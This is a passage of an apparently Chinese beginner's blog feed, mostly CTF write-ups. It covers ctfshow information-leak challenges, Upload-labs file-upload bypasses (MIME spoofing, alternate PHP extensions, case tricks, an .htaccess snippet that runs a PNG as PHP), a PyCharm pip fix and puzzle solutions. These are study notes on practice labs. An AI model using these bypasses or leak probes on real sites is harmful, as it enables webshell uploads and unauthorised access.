OPEN</code><strong>语句会打开一个表，使其能够用后续的</strong><code>HANDLER ... READ</code><strong>语句访问。这个表不能和其他会话共享直到</strong><code>HANDLER ... CLOSE</code>**或会话关闭。</p><p>详情可看<a href="https://www.jianshu.com/p/81fad5351736">大佬博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网安、新手、WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow限免vip题目WP</title>
      <link href="/2023/04/21/ctfshow%E9%99%90%E5%85%8Dvip%E9%A2%98%E7%9B%AEWP/"/>
      <url>/2023/04/21/ctfshow%E9%99%90%E5%85%8Dvip%E9%A2%98%E7%9B%AEWP/</url>
      
        <content type="html"><![CDATA[<p> 学习web时刷题，其题目确实很基础适合我这种新手入手</p><h2 id="一、源码泄露"><a href="#一、源码泄露" class="headerlink" title="一、源码泄露"></a>一、源码泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211819256.png"></p><p>本题就是简单的查看源代码找到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211819910.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="二、前台JS绕过"><a href="#二、前台JS绕过" class="headerlink" title="二、前台JS绕过"></a>二、前台JS绕过</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211820126.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 本题打开后显示无法打开源代码，但好像只要手动打开源代码就能看到flag，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211820840.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>或者将本题用BP抓包就可以拿到flag了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211821021.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="三、协议头信息泄露"><a href="#三、协议头信息泄露" class="headerlink" title="三、协议头信息泄露"></a>三、协议头信息泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211824129.png"></p><p>打开本题也是问flag在哪里，本题要么直接BP抓包然后在重发器发送后头中找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211825332.png"></p><p>或者在浏览器的网络里找到Date，下面有着flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211826033.png"></p><h2 id="四、robots后台泄露"><a href="#四、robots后台泄露" class="headerlink" title="四、robots后台泄露"></a>四、robots后台泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211826548.png"></p><p>如图本题还是一样的要求，根据题目我们可以知道其跟robots有关，所以在本题网址后输入&#x2F;robots.txt，可以得到如下图的情况：<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827220.png"></p><p>再将robots.txt替换成如图的txt,得到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827270.png"></p><h2 id="五、phps源码泄露"><a href="#五、phps源码泄露" class="headerlink" title="五、phps源码泄露"></a>五、phps源码泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827658.png"></p><p>根据本题题目phps源码泄露，想到了index.phps可能与其相关，输入后得到一个phps文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827676.png"> 打开文件后得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828741.png"></p><h2 id="六、源码压缩包泄露"><a href="#六、源码压缩包泄露" class="headerlink" title="六、源码压缩包泄露"></a>六、源码压缩包泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828880.png"></p><p>本题依旧是需要借题目来得到关于flag的线索</p><p>根据上关源码泄露，以及本题源码压缩包泄露 ,直接访问&#x2F;<a href="http://www.zip.一般网站的文件都在www下,所以直接访问www.zip可以得到所需压缩包,打开后里面有俩个文件/">www.zip。一般网站的文件都在www下，所以直接访问www.zip可以得到所需压缩包，打开后里面有俩个文件</a><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828879.png"></p><p>多半与第一个txt文件有关，直接在网站搜索该文件，即在网站后缀加上&#x2F;fl000g.txt。得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828829.png"></p><h2 id="七、版本控制泄露源码"><a href="#七、版本控制泄露源码" class="headerlink" title="七、版本控制泄露源码"></a>七、版本控制泄露源码</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211829737.png">依旧是要依靠题目来得到我们所需的flag，本题题目所设计版本控制，上网搜了下版本控制系统，</p><!--版本控制系统（Version Control System，VCS）是一种软件，可以帮助软件团队的开发人员协同工作，并存档他们工作的完整历史记录-->。 <p> 一般常用的有Git，VSS，SVN等版本，本题所用的便是Git，在网址后面加上&#x2F;.git就能得到flag了</p><h2 id="八、版本控制泄露源码2"><a href="#八、版本控制泄露源码2" class="headerlink" title="八、版本控制泄露源码2"></a>八、版本控制泄露源码2</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211830207.png"></p><p> 根据上题所知，尝试得到本题的版本控制系统是SVN,所以在网站后面加上&#x2F;.svn就可以得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211830193.png"></p><h2 id="九、vim临时文件泄露"><a href="#九、vim临时文件泄露" class="headerlink" title="九、vim临时文件泄露"></a>九、vim临时文件泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831001.png"></p><p>从题目找线索，从而来去得到flag 。当vim文件不正常退出时会生成一个.swp临时文件，从而造成文件信息泄露，一般网站编辑文件都是index.php。所以在文件后面加上&#x2F;index.php.swp得到一个swp文件，打开得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831994.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831991.png"></p><h2 id="十、cookie泄露"><a href="#十、cookie泄露" class="headerlink" title="十、cookie泄露"></a>十、cookie泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831170.png"></p><p>有题目可以得知本题是跟cookie相关的.。要么简单粗暴用BP抓包，直接可以在cookie上看到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831219.png"></p><p><strong>将%7B%7D编码后就是{}</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832008.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832001.png"> 或者就是打开浏览器找到cookie同样可以拿到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832059.png"></p><h2 id="十一-、域名txt记录泄露"><a href="#十一-、域名txt记录泄露" class="headerlink" title="十一 、域名txt记录泄露"></a>十一 、域名txt记录泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832670.png"></p><p>找到一个在线域名解析记录检测，可以在TXT中找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832660.png"></p><h2 id="十二、敏感信息公布"><a href="#十二、敏感信息公布" class="headerlink" title="十二、敏感信息公布"></a>十二、敏感信息公布</h2><p>打开网站是一个购物平台</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833094.png">不知道从哪下手，然后御剑扫出一个网站+<strong>&#x2F;admin</strong>，后来发现用**&#x2F;robots.txt<strong>也能得到这个网站+</strong>&#x2F;admin**，如图</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833426.png"></p><p>打开后发现是个登录系统</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833430.png"></p><p>猜测用户名是admin，密码考虑题目敏感信息公布，猜测可能就在那个网站里，当移到最下面时发现有一串数字，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833951.png"></p><p>重新回到登录系统，尝试后登录成功拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833961.png"></p><h2 id="十三、内部技术文档泄露"><a href="#十三、内部技术文档泄露" class="headerlink" title="十三、内部技术文档泄露"></a>十三、内部技术文档泄露</h2><p>本题打开后也是如十二题一样是个网站，尝试像十二题那样查询robots.txt无果，只能从这网站找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834788.png"></p><p>原本一筹莫展，当翻到网址最下面，发现其”document”可以点击,从中找到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834603.png"></p><p>document移到最下面的内容为下图</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834526.png"></p><p>将原本的网站加上&#x2F;system1103&#x2F;login.php进入登录界面，输入默认用户名和密码得到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834501.png"></p><h2 id="十四、编辑器配置不当"><a href="#十四、编辑器配置不当" class="headerlink" title="十四、编辑器配置不当"></a>十四、编辑器配置不当</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834819.png"></p><p>打开后是跟十一、十二关那样是一个页面，但根据题目内的提示，在网站后缀加上&#x2F;editor进入一个新的页面</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834763.png"></p><p>找到上传文件的地方，进入文件空间，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835034.png"></p><p>打开文件空间，依次点击**&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere**,从而发现藏在其中的txt文件，</p><p>然后通过在主网址上加上**&#x2F;nothinghere&#x2F;fl000g.txt**找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835023.png"></p><h2 id="十五、密码逻辑脆弱"><a href="#十五、密码逻辑脆弱" class="headerlink" title="十五、密码逻辑脆弱"></a>十五、密码逻辑脆弱</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835198.png"></p><p>仍然是网页，放进御剑里扫一扫，扫出一个admin</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835060.png"></p><p>进入一看是登录页面，猜测用户名应该是admin，但是密码未知</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835055.png"></p><p>发现有个忘记密码的按钮，点进去后需要回答密保问题才能得到密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835064.png"></p><blockquote><p>再结合本题所给的提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p> 返回主网站，找到邮箱，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836434.png"></p><p>然后登录自己qq查询该账号，发现其人在西安，返回回答问题，得到密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836432.png"> 然后输入用户名和密码得到flag</p><h2 id="十六、探针泄露"><a href="#十六、探针泄露" class="headerlink" title=" 十六、探针泄露"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836206.png"> 十六、探针泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836281.png"> 打开页面就是一个元素周期表，没有任何线索，但是根据题目所给提示，考虑与探针相关</p><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p> 所以在网站后面加上**&#x2F;tz.php**</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837626.png"></p><p>点击后可以从里面找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837606.png"></p><h2 id="十七、CDN穿透"><a href="#十七、CDN穿透" class="headerlink" title="十七、CDN穿透"></a>十七、CDN穿透</h2><p>这题应该是坏了，直接提示把答案发出来了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837837.png"> 如果查这个网站的IP地址提交上去的是错误的。</p><h2 id="十八、js敏感信息泄露"><a href="#十八、js敏感信息泄露" class="headerlink" title="十八、js敏感信息泄露"></a>十八、js敏感信息泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837089.png"></p><p>本题打开后发现是一个小游戏，一般网站小游戏考虑达到一定的分数给出flag，所以查询源代码来看看是否有满足分数条件给flag的代码。发现当分数大于100时会给出一串十六进制编码。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837045.png"> 将这十六进制编码进行ascii转换，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838810.png"> 所以在主网站的后面加上&#x2F;110.php。得到flag</p><h2 id="十九、前端密钥泄露"><a href="#十九、前端密钥泄露" class="headerlink" title=" 十九、前端密钥泄露"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838224.png"> 十九、前端密钥泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838181.png"> 打开后是一个登录页面，查看源代码可以发现一个post<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838188.png"> 然后在火狐浏览器或者BP中POST传参，得到flag</p><h2 id="二十、数据库恶意下载"><a href="#二十、数据库恶意下载" class="headerlink" title=" 二十、数据库恶意下载"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838323.png"> 二十、数据库恶意下载</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838285.png"> 根据题目提示</p><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。 </p></blockquote><p>所以在网站后面加入&#x2F;db&#x2F;db.mdb得到一个下载的文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211839148.png"></p><p>用notepad++打开查找”flag”找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211839136.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>重写一遍还是受益良多的</p>]]></content>
      
      
      
        <tags>
            
            <tag> web、网安、新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs靶场(01-06)</title>
      <link href="/2023/04/01/Upload-labs%E9%9D%B6%E5%9C%BA-01-06/"/>
      <url>/2023/04/01/Upload-labs%E9%9D%B6%E5%9C%BA-01-06/</url>
      
        <content type="html"><![CDATA[<p>本博客只是自己当时做题的想法，并未涉及太深，要更深层次了解，还是需要去看看其他大佬的做题思路。</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>首先会发现，如果直接上传php，会提示不让直接上传该图片<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211019442.png"><br>但是上传图片可以上传，所以放入BP中看看<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020395.png"><br>将1.png修改为1.php再发送，<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020908.png"><br>再通过靶场查询这个php，上传成功<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020662.png"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><h3 id="1、修改上传类型"><a href="#1、修改上传类型" class="headerlink" title="1、修改上传类型"></a>1、修改上传类型</h3><p>首先根据源代码可以看到，这是需要确认文件类型<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020639.png"><br>所以可以通过用BP去抓个php文件的包，然后将如下图标注的地方进行修改，可以将Content-Type修改为允许上传的类型image&#x2F;jpeg或image&#x2F;png或image&#x2F;gif。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020904.png"><br>修改后发送发现上传成功。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020641.png"><br>访问验证一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020386.png"></p><h3 id="2、如Pass-1的做法"><a href="#2、如Pass-1的做法" class="headerlink" title="2、如Pass 1的做法"></a>2、如Pass 1的做法</h3><p>先上传图片，然后文件类型就已经变成图片的类型，然后再将图片后缀修改为php，发送。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020938.png"><br><img src="https://img-blog.csdnimg.cn/21c302db6b424a1b8884cd4aa1ea8231.png"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>首先查看这道题的源代码，发现是黑名单验证<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020723.png"><br>且不允许上传.php后缀文件，我这里是将php后缀修改成php5后上传。发现成功上传<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020292.png"><br>访问一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020639.png"><br>详情可以看这位大佬的黑名单绕过，里面不局限于php5后缀，还是有很多修改可以上传。<br><a href="https://blog.csdn.net/qq_25899635/article/details/90344198">大佬博客</a></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>先查看源代码<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020418.png"><br>发现很多后缀被禁止上传。所以需要用到.htaccess配置文件，并且在其<br>文件内部写上<br>    &lt;FileMatch”4.png”&gt;<br>    SetHandler application&#x2F;x-httpd-php<br>可以将其中4.png解析为php，在其中写入php代码就行，<br>然后通过BP抓图片包，将其在重发器中发送一下，发现上传成功，访问4.png就行了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021541.png"><br>访问一下，因为我这个浏览器访问会黑屏，所以看源代码<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021757.png"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>从源代码来看和上题一样导致很多文件无法上传，且上题使用的.htaccess文件也被限制了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021860.png"><br>但其中php7文件后缀还可以使用绕过，利用BP抓包并将后缀改为php7，发现上传成功。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021342.png"><br>访问一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021667.png"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>这道题可以通过php大小写绕过，先用BP抓住一个php后缀文件的包，然后在重发器将其后缀修改为PHP，发现上传成功<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021340.png"><br>访问一下验证。（不知道为什么打到6的适时候浏览网站就无法看到，显示内部浏览器错误，所以这是找的一个大佬的做的结果），其最后结果就是访问后类似这个就说明上传成功了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021871.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做这个时候发现很多自己不会的知识，也从中学习到了很多，希望能慢慢学习，不断进步。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web、靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决pythoncharm中关于Crypto的相关问题</title>
      <link href="/2023/02/08/%E8%A7%A3%E5%86%B3pythoncharm%E4%B8%AD%E5%85%B3%E4%BA%8ECrypto%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
      <url>/2023/02/08/%E8%A7%A3%E5%86%B3pythoncharm%E4%B8%AD%E5%85%B3%E4%BA%8ECrypto%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p> 在学习一道rsa题wp中，发现其代码无法在我的PythonCharm中运行并发出报错，报错内容如下：</p><blockquote><p>from Crypto.Util.number import *<br>ImportError: No module named Crypto.Util.number </p></blockquote><p>上网搜索原因是我的pythoncharm中并没有crypto的下载，需要通过pip对其进行下载。于此同时，发现我的pip也无法使用（晕），当我使用pip时给我发出如下的报错：</p><blockquote></blockquote><p>pip : 无法将“pip”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确， 然后再试一次。 所在位置 行:1 字符: 1 + pip ins</p><p>于是我又上网查询一下解决出现这种问题的方法。解决方式如下：<br>一般来说，让我们下载PythonCharm时，pip也已经下载好了，可以通过打开PythonCharm左上角的 文件&#x2F;设置&#x2F;项目&#x2F;Python解释器 找到它。如图：<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021780.png"><br>但是如果直接在PythonCharm的终端里面打出:<br>     <code>pip install crypto</code></p><p>就会出现上面我所说的报错， 就是虽然下载了pip，但并未在PythonCharm中配置pip环境，所以无法使用，所以我们需要对pip进行环境配置，第一步是直接在PythonCharm内部进行pip的环境配置，有的人在第一步后就可以使用pip了，但是有的还是会出现pip的报错(比如我)，所以我们还需要对系统进行环境配置，下面是第一步的步骤：</p><p>首先还是打开PythonCharm，找到左上角的  文件&#x2F;设置&#x2F;项目  找到如图所在的位置，并点击红圈标记的地方<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021253.png"><br>然后进入环境变量界面，点击 “ + ” <br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021497.png"><br>名称：Path  值：复制下图中的位置部分<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021820.png"><br>应用后重启PythonCharm，然后打开PythonCharm中的终端输入pip，看是否出现如下图的情况<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021717.png"><br>如果出现，则说明pip配置成功，如果没有出现该图情况，则进行第二步，对系统环境进行配置，找到电脑中的高级系统设置，点击红圈标注的位置<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021146.png"><br>找到系统变量（就是点进去后下面那一处）然后找到其中为Path的变量，双击后点击新建，将刚才复制的地址粘贴上去，然后再次打开PythonCharm就可以使用pip的功能了。</p><p>接下来是关于Crypto的问题，当我输入<br><code>pip install crypto</code>并运行后<br>出现下面的情况</p><blockquote><p>from Crypto.Util.number import *<br>ModuleNotFoundError: No module named ‘Crypto’</p></blockquote><p>上网搜寻原因是因为crypto这个库过时了，现在都是下载pycryptodome<br>下载它的代码是<br><code>pip install crypto pycryptodome</code><br>​<br>详情可以参考这位大佬的CSDN博客<br><a href="https://blog.csdn.net/Ahuuua/article/details/108800712">​https://blog.csdn.net/Ahuuua/article/details/108800712<br>​</a></p><p>总结</p><p>以上便是我解决这些问题中所做的行为，虽然解决了我的问题，但是不能保证解决大家的问题，仅供参考，很多大佬写的远比我这详细，也希望能给大家带来一些帮助。</p><p>​​</p>]]></content>
      
      
      
        <tags>
            
            <tag> 见解，参考，学习。 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SLsec招新赛</title>
      <link href="/2023/01/09/SLsec%E6%8B%9B%E6%96%B0%E8%B5%9B/"/>
      <url>/2023/01/09/SLsec%E6%8B%9B%E6%96%B0%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h2 id="一、熊曰"><a href="#一、熊曰" class="headerlink" title="一、熊曰"></a>一、熊曰</h2><p>从题目看到是一串不知道什么的什么，但根据题目名字，考虑到与熊论道<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010239.png"><br>所以通过网上搜寻与熊论道，得到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010589.png"><br> 链接：<a href="http://hi.pcmoe.net/">熊曰解密</a></p><h2 id="二、这个皮卡丘有点矮"><a href="#二、这个皮卡丘有点矮" class="headerlink" title="二、这个皮卡丘有点矮"></a>二、这个皮卡丘有点矮</h2><p>打开题目得到一个附件是一张皮卡丘图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010243.png">通过图片，考虑到可能是考察图片长短，所以可以通过010改变图片长短来找到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010696.png"><br>最终得到flag，就在皮卡丘的脚下<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010268.png"></p><h2 id="三、vivo50"><a href="#三、vivo50" class="headerlink" title="三、vivo50"></a>三、vivo50</h2><p>本题所给附件是一个pdf文件，打开后发现是一张图片，没有线索，不过可以通过pdf文件中的，如下图找到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010815.png"></p><h2 id="四、你是lsp吗"><a href="#四、你是lsp吗" class="headerlink" title="四、你是lsp吗"></a>四、你是lsp吗</h2><p>本题附件是一张图片，通过010查询没有什么问题，通过stegsolve中的data extract发现里面还有一张图片，得到一张二维码<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010214.png"><br>通过扫描二维码得到一串base字符<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010712.png"><br>通过base32解密得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010130.png"><br>base32解密链接：<a href="https://ctf.bugku.com/tool/base32">base32</a></p><h2 id="五、起风了"><a href="#五、起风了" class="headerlink" title="五、起风了"></a>五、起风了</h2><p>本题附件图片是一串看不懂的字符，拖到010试试<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010918.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010333.png"><br>得到一串代码，看着像base解密，通过base解密得到一句英语<img src="https://img-blog.csdnimg.cn/a81ea7619c214581b692e34ae5354921.png"><br>网上英语翻译知道其意思<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011195.png">上网搜索提瓦特解密得到以下内容<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011911.png"><br>得到flag：SLsec{yuanlainishiop}</p><h2 id="六、你会相信PDD吗？"><a href="#六、你会相信PDD吗？" class="headerlink" title="六、你会相信PDD吗？"></a>六、你会相信PDD吗？</h2><p>打开压缩包发现图片被加密了，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011817.png"><br>考虑到没有任何密码提示，有可能是压缩包伪加密，通过010修改得到图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011334.png"><br>发现是一张二维码但缺失一个定位角，下面有俩种方法。第一种方法、通过ps技术找到一个二维码定位角角补齐二维码通过扫描得到答案。第二种方法、通过CQR得到二维码藏的东西<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011084.png"><br>通过内容考虑栅栏密码，得到flag<img src="https://img-blog.csdnimg.cn/abad0cd0fd40457ab72fde28014e82c9.png"></p><h2 id="七、情报员CPU"><a href="#七、情报员CPU" class="headerlink" title="七、情报员CPU"></a>七、情报员CPU</h2><p>打开附件发现是一个加密压缩包，<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011626.png"><br>打开passwd1<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011887.png"><br>可以考虑干支解密，通过<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011509.png"><br>对照得到密码，打开第二个压缩包也是加密的，打开passwd2<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011994.png"><br>看出是核心价值观编码<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011069.png"><br>打开第二个压缩包得到一张图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011889.png"><br>得到CPU带来的秘密图片通过010看到藏着一串数字，考虑ascii码加密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011979.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011956.png">得到flag，结果用SLsec{}包装<br>链接:<a href="https://ctf.bugku.com/tool/cvecode">核心价值观编码</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="一、签到"><a href="#一、签到" class="headerlink" title="一、签到"></a>一、签到</h2><p>通过网页捕获找到这个flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011984.png"><br>再通过保存图片，通过网上图片文字提取得到flag<img 